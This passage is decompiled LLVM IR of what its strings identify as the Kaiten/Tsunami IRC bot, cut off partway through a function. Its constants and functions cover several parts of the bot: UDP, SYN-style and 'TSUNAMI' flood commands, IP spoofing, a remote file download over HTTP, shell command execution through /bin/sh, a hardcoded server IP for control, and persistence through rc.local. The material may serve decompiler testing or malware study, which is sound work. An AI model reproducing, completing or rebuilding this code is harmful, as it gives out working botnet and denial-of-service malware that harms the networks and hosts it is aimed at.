source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4_eq = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208013441
@global_var_10010000.2 = global i32 -1
@global_var_1001000c.4 = global i32 0
@global_var_1001001c.5 = local_unnamed_addr global i32* @global_var_1001000c.4
@global_var_100104e4.7 = global i32 0
@global_var_100104fc.8 = global i32 0
@global_var_10010478.10 = local_unnamed_addr global i32 0
@global_var_1000d3c0.11 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1000053c.12 = constant i32 939524097
@global_var_10010468.13 = local_unnamed_addr global i32 0
@global_var_1001048c.14 = local_unnamed_addr global i32 0
@global_var_10010464.16 = local_unnamed_addr global i32 0
@global_var_1000d3e0.17 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000d3f0.18 = constant i32 1912602624
@global_var_10010470.19 = local_unnamed_addr global i32 0
@global_var_1000d3f4.20 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d78.21 = constant [3 x i8] c"8`\00"
@global_var_1000d410.22 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f90.23 = constant [3 x i8] c"8`\00"
@global_var_10000f98.24 = constant [3 x i8] c"8`\00"
@global_var_1000d434.25 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fd8.26 = constant [3 x i8] c"8`\00"
@global_var_1000d45c.27 = constant [8 x i8] c"http://\00"
@global_var_1000102c.28 = constant i32 1207959584
@global_var_1000104c.29 = constant i32 939524096
@global_var_1000d464.30 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001124.31 = constant [3 x i8] c"8`\00"
@global_var_1000112c.32 = constant [3 x i8] c"9?\00"
@global_var_1000115c.33 = constant i32 1207959564
@global_var_1000d48c.34 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011b8.35 = constant [3 x i8] c"8`\00"
@global_var_1000d4b4.36 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1000d5c8.37 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1000d5e4.38 = constant [3 x i8] c"wb\00"
@global_var_1000d5e8.39 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001344.40 = constant i32 1207959588
@global_var_1000d5f0.41 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_100014a8.42 = constant i32 1207959588
@global_var_100014fc.43 = constant [3 x i8] c"8`\00"
@global_var_1000d608.44 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015f4.45 = constant i32 1207959756
@global_var_1000d628.46 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1000d658.47 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_1000d678.48 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001780.49 = constant i32 1207959652
@global_var_1000d690.50 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_100017bc.51 = constant i32 1207959592
@global_var_1000d6c8.52 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1000d6d4.53 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1000d6f0.54 = constant [9 x i8] c"Disabled\00"
@global_var_1000d6fc.55 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1000d718.56 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_10001890.57 = constant i32 1207959752
@global_var_1000d73c.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100018c0.59 = constant i32 1207959704
@global_var_1000d75c.60 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_100018fc.61 = constant i32 1207959644
@global_var_10012b24.62 = global i32 0
@global_var_1000d784.63 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1000d7a4.64 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001a04.65 = constant i32 1207959708
@global_var_1000d7c0.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001a34.67 = constant i32 1207959660
@global_var_1000d7e0.68 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001a78.69 = constant i32 1207959592
@global_var_1000d7fc.70 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1000d81c.71 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1000d83c.72 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001b58.73 = constant i32 1207959952
@global_var_1001046c.76 = global i32 0
@global_var_1000d88c.77 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001d88.78 = constant [3 x i8] c"8`\00"
@global_var_1000d8b0.79 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10001e80.80 = constant [3 x i8] c"8`\00"
@global_var_1000d8d8.81 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_100020f0.82 = constant i32 939524096
@global_var_1000d8f4.83 = constant i32 2
@global_var_10002164.84 = constant i32 939524096
@global_var_1000d944.85 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_100021bc.86 = constant [3 x i8] c"8`\00"
@global_var_100021c4.87 = constant [3 x i8] c"8`\00"
@global_var_100021f0.88 = constant i32 939524096
@global_var_1000d96c.89 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1000254c.90 = constant [3 x i8] c"9?\00"
@global_var_100025f0.91 = constant i32 939524096
@global_var_1000d984.92 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_10002698.93 = constant [3 x i8] c"8`\00"
@global_var_100026e8.94 = constant [3 x i8] c"8`\00"
@global_var_10002708.95 = constant i32 1207984077
@global_var_1000d9a8.96 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_10002980.97 = constant [3 x i8] c"9?\00"
@global_var_10002a3c.98 = constant [3 x i8] c"8`\00"
@global_var_10010480.106 = local_unnamed_addr global i32 0
@global_var_10010458.107 = local_unnamed_addr global i32 0
@global_var_10010488.143 = local_unnamed_addr global i32 0
@global_var_10010474.145 = local_unnamed_addr global i32 0
@global_var_1000e174.158 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_10010484.159 = local_unnamed_addr global i32 0
@global_var_1000e184.160 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000e194.161 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000e19c.162 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1000e1a8.163 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10003b84.164 = constant i32 1207959720
@global_var_10010410.168 = local_unnamed_addr global i32 1
@global_var_1000d3b0.169 = constant [16 x i8] c"212.109.222.122\00"
@global_var_10010414.170 = global [16 x i8]* @global_var_1000d3b0.169
@global_var_10003f14.171 = constant i32 1207959580
@global_var_10003f6c.172 = constant [3 x i8] c"8`\00"
@global_var_1000402c.173 = constant i32 1207959668
@global_var_10004060.174 = constant [3 x i8] c"8`\00"
@global_var_1000e228.175 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1000e23c.176 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1000e24c.177 = constant i32 788529152
@global_var_1000e250.178 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_100041ec.179 = constant i32 1207959620
@global_var_1000e258.180 = constant i32 1627389952
@global_var_10004294.181 = constant i32 1207959576
@global_var_100042a0.182 = constant i32 1207959564
@global_var_100042ac.183 = constant i32 1207961681
@global_var_1000e25c.184 = constant [6 x i8] c"-bash\00"
@global_var_100042f4.185 = constant i32 939524097
@global_var_1001047c.186 = local_unnamed_addr global i32 0
@global_var_1000e264.187 = constant [4 x i8] c"#AS\00"
@global_var_1000e268.188 = constant i32 0
@global_var_1000e26c.189 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10004438.190 = constant i32 1207959556
@global_var_1000e298.191 = constant i32 167772160
@global_var_10004820.192 = constant i32 1207959568
@global_var_100048c8.193 = constant i32 939524096
@global_var_1000e208.194 = constant [4 x i8] c"352\00"
@global_var_100100a4.195 = global [4 x i8]* @global_var_1000e208.194
@global_var_1000e29c.196 = constant [6 x i8] c"ERROR\00"
@global_var_10004a4c.197 = constant i32 1207959564
@global_var_10004c24.198 = constant i32 1207959560
@global_var_100104ac.199 = local_unnamed_addr global i32 0
@global_var_100104bc.204 = global i32 0
@global_var_100091f4.205 = constant [3 x i8] c"8`\00"
@global_var_100100fc.206 = global i32 0
@global_var_10010494.207 = local_unnamed_addr global i32 0
@global_var_10010498.208 = local_unnamed_addr global i32 0
@global_var_10004f74.209 = constant i32 1207966661
@global_var_100108fc.210 = global i32 0
@global_var_10010490.211 = local_unnamed_addr global i32 0
@global_var_10005168.212 = constant i32 939524118
@global_var_10005240.213 = constant i32 939524096
@global_var_10005264.214 = constant [3 x i8] c"9`\00"
@global_var_100052d4.215 = constant i32 1207959864
@global_var_100052fc.217 = constant i32 1207976529
@global_var_1000e5a4.218 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000e5ac.219 = constant [3 x i8] c"sh\00"
@global_var_1000e5b0.220 = constant [3 x i8] c"-c\00"
@global_var_10005384.221 = constant [3 x i8] c"8`\00"
@global_var_10005400.222 = constant i32 1207959580
@global_var_10005414.223 = constant i32 939524096
@global_var_10005478.224 = constant i32 939524118
@global_var_1000549c.225 = constant i32 1207960124
@global_var_1001043c.226 = local_unnamed_addr global i32 2
@global_var_100100e4.227 = global i32 0
@global_var_10010438.228 = global i32* bitcast (i16* @global_var_10010114.201 to i32*)
@global_var_100056d4.229 = constant i32 1207959560
@global_var_10005724.230 = constant [3 x i8] c" c\00"
@global_var_10005740.231 = constant [3 x i8] c" c\00"
@global_var_1000e5b8.232 = constant i32 0
@global_var_100059dc.233 = constant i32 1207961084
@global_var_10005b04.234 = constant i32 1207960764
@global_var_1000e5ec.235 = constant i32 269488136
@global_var_1000e5d0.236 = constant [6 x i8] c"(nil)\00"
@global_var_1000e5d8.237 = constant [7 x i8] c"(null)\00"
@global_var_1000e5e0.238 = constant i32 721431808
@global_var_10005f60.239 = constant i32 939524096
@global_var_1000e66c.240 = constant i32 65793
@global_var_1000e654.241 = constant i32 524293
@global_var_1001044c = external local_unnamed_addr global i32
@global_var_1000f616.243 = constant i32 1
@global_var_1000e64c.244 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000e5f4.245 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000e634.246 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000e628.247 = constant i32 67343
@global_var_1000e627.248 = constant i32 50331911
@global_var_1000e618.249 = constant i32 268435461
@global_var_1000e608.250 = constant i32 520093701
@global_var_10006918.251 = constant [3 x i8] c"8a\00"
@global_var_10006d0c.252 = constant i32 1207959708
@global_var_10006db4.253 = constant i32 1207959612
@global_var_10007024.254 = constant i32 939589631
@global_var_100070d8.255 = constant i32 939524118
@global_var_1000e688.256 = constant [8 x i8] c"Success\00"
@global_var_1000e678.257 = constant [15 x i8] c"Unknown error \00"
@global_var_10010454.258 = local_unnamed_addr global i32* @global_var_1000f616.243
@global_var_1001049c.259 = global i32 0
@global_var_10012ae0.260 = global i32 0
@global_var_10012914.261 = global i32 0
@global_var_100103e0.262 = global i32 0
@global_var_100104c8.263 = local_unnamed_addr global i32 0
@global_var_10012d4c.264 = global i32 0
@global_var_10007da0.265 = constant [3 x i8] c"8`\00"
@global_var_10007e84.266 = constant i32 939524098
@global_var_10007ec4.267 = constant [3 x i8] c"8`\00"
@global_var_10012af4.268 = global i32 0
@global_var_10010440 = external global i32
@global_var_10012d24.271 = global i32 0
@global_var_100081d0.272 = constant i32 939524108
@global_var_10008268.273 = constant [3 x i8] c"8`\00"
@global_var_10008314.274 = constant [3 x i8] c"8`\00"
@global_var_1000863c.275 = constant i32 1207959640
@global_var_10008678.276 = constant i32 1207959580
@global_var_10010310.277 = global i32 0
@global_var_10010328 = external global i32
@global_var_10010348.279 = global i32 -1726662223
@global_var_10010330.280 = local_unnamed_addr global i32* @global_var_10010348.279
@global_var_1001032c.281 = global i32* @global_var_10010348.279
@global_var_1000f1e4.282 = constant i32 0
@global_var_10008990.283 = constant i32 939524118
@global_var_10008bb4.284 = constant i32 939524096
@global_var_10008da4.285 = constant i32 939524130
@global_var_100103c4.286 = global i32 0
@global_var_100104a0.287 = local_unnamed_addr global i32 0
@global_var_10008e38.288 = constant i32 1207960361
@global_var_100104a8.289 = local_unnamed_addr global i32 0
@global_var_100104b0.290 = local_unnamed_addr global i32 0
@global_var_100104b4.291 = local_unnamed_addr global i32 0
@global_var_1000f20c.292 = constant [10 x i8] c"/dev/null\00"
@global_var_100104b8.293 = local_unnamed_addr global i32 0
@global_var_100104a4.294 = local_unnamed_addr global i32 0
@global_var_1000950c.295 = constant i32 939524096
@global_var_10009528.296 = constant i32 939524096
@global_var_1000954c.297 = constant i32 939524285
@global_var_100104dc.298 = local_unnamed_addr global i32 0
@global_var_10009a3c.299 = constant i32 939524118
@global_var_100104c0.300 = global i32 0
@global_var_10009b7c.301 = constant i32 939524180
@global_var_10009efc.302 = constant i32 939524105
@global_var_1000f840.303 = constant [4 x i8] c"inf\00"
@global_var_1000f843.305 = constant i32 4804166
@global_var_1000f850.306 = constant i32 771763200
@global_var_10012b0c.308 = global i32 0
@global_var_100104c4.309 = local_unnamed_addr global i32 0
@global_var_1000aeb4.311 = constant i32 1207960848
@global_var_100104cc.312 = local_unnamed_addr global i32 0
@global_var_1000f8a0.313 = constant i32 771751936
@global_var_10012d3c.314 = global i32 0
@global_var_1000afa4.315 = constant [3 x i8] c"8a\00"
@global_var_1000afb0.316 = constant i32 939524097
@global_var_1000b084.317 = constant i32 939524097
@global_var_1000b158.318 = constant i32 939524097
@global_var_1000b184.319 = constant i32 939524100
@global_var_1000b264.320 = constant i32 1207959684
@global_var_1000b3e0.321 = constant i32 939589631
@global_var_1000f8bc.322 = constant i32 1912602624
@global_var_1000f8a8.323 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000f8c0.324 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000f8d8.325 = constant [11 x i8] c"nameserver\00"
@global_var_1000f8e4.326 = constant [7 x i8] c"domain\00"
@global_var_1000f8ec.327 = constant [7 x i8] c"search\00"
@global_var_1000b718.328 = constant i32 1207959568
@global_var_1000b720.329 = constant i32 939524099
@global_var_100103f8.330 = global i32 0
@global_var_1000b934.331 = constant i32 939524129
@global_var_100104d0.332 = local_unnamed_addr global i32 0
@global_var_1000b9a4.333 = constant [3 x i8] c"8`\00"
@global_var_1000b9dc.334 = constant i32 939524129
@global_var_100104d4.335 = local_unnamed_addr global i32 0
@global_var_100104d8.336 = local_unnamed_addr global i32 0
@global_var_1000bdec.337 = constant i32 939524171
@global_var_1000be9c.338 = constant i32 939524105
@global_var_1000c1e8.339 = constant [3 x i8] c"8`\00"
@global_var_1000f908.340 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000c3e0.341 = constant [3 x i8] c"9 \00"
@global_var_1000c3ec.342 = constant i32 939524193
@global_var_1000c454.344 = constant i32 939524101
@global_var_1000c540.345 = constant i32 939524124
@global_var_1000c5b8.346 = constant i32 1207960116
@global_var_1000c5d0.347 = constant i32 939524105
@global_var_1000c748.348 = constant [3 x i8] c"9 \00"
@global_var_1000f91c.349 = constant [3 x i8] c"%x\00"
@global_var_1000c7d4.350 = constant i32 939524124
@global_var_1000c7f8.351 = constant i32 939524193
@global_var_1000f920.352 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000f92c.353 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000cee4.354 = constant i32 1207959560
@global_var_1000cf7c.355 = constant i32 939589631
@global_var_10010004.356 = global i32 0
@global_var_100104e0.3 = local_unnamed_addr global i8 0
@global_var_1001045c.9 = local_unnamed_addr global i8 0
@global_var_10010460.15 = external local_unnamed_addr global i8*
@global_var_10010463.165 = external local_unnamed_addr global i8*
@global_var_10010462.166 = external local_unnamed_addr global i8*
@global_var_10010461.167 = external global i8*
@global_var_10010114.201 = global i16 288
@global_var_10010164.202 = local_unnamed_addr global i16 272
@global_var_100103dc.310 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000d324(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_100104e0.3, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_100104e0.3, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_100104e0.3, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16) to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16)
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @function_100092e0(i32 268452024, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -11376), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @function_10000238(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10000238:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 42
  br i1 %v3_1000026c, label %dec_label_pc_100002a4, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %dec_label_pc_10000238
  %v3_10000278 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_10000278, label %dec_label_pc_10000318, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_10000284, label %dec_label_pc_10000290, label %dec_label_pc_10000374

dec_label_pc_10000290:                            ; preds = %dec_label_pc_10000280
  %v2_10000294 = load i8, i8* %tmp, align 1
  %v3_10000294 = zext i8 %v2_10000294 to i32
  br label %dec_label_pc_100003f8

dec_label_pc_100002a4:                            ; preds = %dec_label_pc_10000238
  %v2_100002a8 = add i32 %tmp8, 1
  store i32 268436152, i32* @lr, align 4
  %v5_100002b4 = inttoptr i32 %v2_100002a8 to i8*
  %v6_100002b4 = call i32 @function_10000238(i8* %v5_100002b4, i32 %arg2, i32 %tmp8)
  %v3_100002bc = icmp eq i32 %v6_100002b4, 0
  br i1 %v3_100002bc, label %dec_label_pc_10000304, label %dec_label_pc_100002c4

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_100002a4
  %v2_100002c8 = load i8, i8* %tmp, align 1
  %v3_100002d0 = icmp eq i8 %v2_100002c8, 0
  br i1 %v3_100002d0, label %dec_label_pc_1000030c, label %dec_label_pc_100002d8

dec_label_pc_100002d8:                            ; preds = %dec_label_pc_100002c4
  %v2_100002dc = add i32 %arg2, 1
  store i32 268436204, i32* @lr, align 4
  %v6_100002e8 = call i32 @function_10000238(i8* nonnull %arg1, i32 %v2_100002dc, i32 %arg2)
  %v3_100002f0 = icmp eq i32 %v6_100002e8, 0
  br i1 %v3_100002f0, label %dec_label_pc_10000304, label %dec_label_pc_1000030c

dec_label_pc_10000304:                            ; preds = %dec_label_pc_100002d8, %dec_label_pc_100002a4
  br label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_100002c4, %dec_label_pc_100002d8, %dec_label_pc_10000304
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000304 ], [ 1, %dec_label_pc_100002d8 ], [ 1, %dec_label_pc_100002c4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000318:                            ; preds = %dec_label_pc_10000274
  %v2_1000031c = load i8, i8* %tmp, align 1
  %v3_10000324 = icmp eq i8 %v2_1000031c, 0
  br i1 %v3_10000324, label %dec_label_pc_10000368, label %dec_label_pc_1000032c

dec_label_pc_1000032c:                            ; preds = %dec_label_pc_10000318
  %v1_10000330 = add i32 %tmp8, 1
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v4_10000344 = inttoptr i32 %v1_10000330 to i8*
  %v5_10000344 = call i32 @function_10000238(i8* %v4_10000344, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp ne i32 %v5_10000344, 0
  %. = zext i1 %v3_1000034c to i32
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_1000032c, %dec_label_pc_10000318
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10000318 ], [ %., %dec_label_pc_1000032c ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000280
  %v3_10000378 = load i8, i8* %arg1, align 1
  %v4_10000378 = zext i8 %v3_10000378 to i32
  store i32 268436364, i32* @lr, align 4
  %v3_10000388 = call i32 @function_10004e18(i32 %v4_10000378, i32 %tmp8)
  %v3_10000394 = load i8, i8* %tmp, align 1
  %v4_10000394 = zext i8 %v3_10000394 to i32
  store i32 268436392, i32* @lr, align 4
  %v3_100003a4 = call i32 @function_10004e18(i32 %v4_10000394, i32 %arg2)
  %v4_100003ac = icmp eq i32 %v3_10000388, %v3_100003a4
  br i1 %v4_100003ac, label %dec_label_pc_100003b4, label %dec_label_pc_100003f0

dec_label_pc_100003b4:                            ; preds = %dec_label_pc_10000374
  %v1_100003b8 = add i32 %tmp8, 1
  %v2_100003c0 = add i32 %arg2, 1
  store i32 268436432, i32* @lr, align 4
  %v4_100003cc = inttoptr i32 %v1_100003b8 to i8*
  %v5_100003cc = call i32 @function_10000238(i8* %v4_100003cc, i32 %v2_100003c0, i32 %arg2)
  %v3_100003d4 = icmp ne i32 %v5_100003cc, 0
  %.7 = zext i1 %v3_100003d4 to i32
  br label %dec_label_pc_100003f0

dec_label_pc_100003f0:                            ; preds = %dec_label_pc_100003b4, %dec_label_pc_10000374
  %storemerge = phi i32 [ 1, %dec_label_pc_10000374 ], [ %.7, %dec_label_pc_100003b4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_10000368, %dec_label_pc_1000030c, %dec_label_pc_10000290, %dec_label_pc_100003f0
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000030c ], [ %storemerge2, %dec_label_pc_10000368 ], [ %v3_10000294, %dec_label_pc_10000290 ], [ %storemerge, %dec_label_pc_100003f0 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_10004e18, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100003f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000030c, { 2, 1, 0 }
}

define i32 @function_1000041c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000041c:
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v2_100004a0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436652, i32* @lr, align 4
  %v4_100004a8 = call i32 @function_10004f9c(i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32 %arg2, i32 %v2_100004a0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v0_100004b4 = call i32 @function_10007284()
  store i32 268436688, i32* @lr, align 4
  %v2_100004cc = call i32 @function_10004dd0(i32 %arg1, i32 ptrtoint (i32* @global_var_100104fc.8 to i32))
  ret i32 %v2_100004cc

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100104fc.8 to i32), { 1, 2, 0, 3 }
}

define i32 @function_100004f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100004f0:
  %v3_1000050c = load i8, i8* @global_var_1001045c.9, align 1
